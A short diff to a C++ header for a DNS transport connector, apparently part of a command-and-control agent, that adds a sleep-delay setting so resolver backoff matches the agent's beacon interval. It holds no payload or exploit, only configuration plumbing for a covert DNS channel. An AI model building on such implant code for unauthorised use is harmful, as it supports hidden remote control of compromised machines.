@@ -52,10 +52,14 @@ private:
     // transport failover decisions.
     BOOL  lastQueryOk     = FALSE;
 
+    // Backoff tuning: adapt resolver disable duration to agent sleep
+    // (stored as seconds, as configured by the agent)
+    ULONG sleepDelaySeconds = 0;
+
 public:
     ConnectorDNS();
 
-    BOOL SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize);
+    BOOL SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds);
     void CloseConnector();
 
     void  SendData(BYTE* data, ULONG data_size);
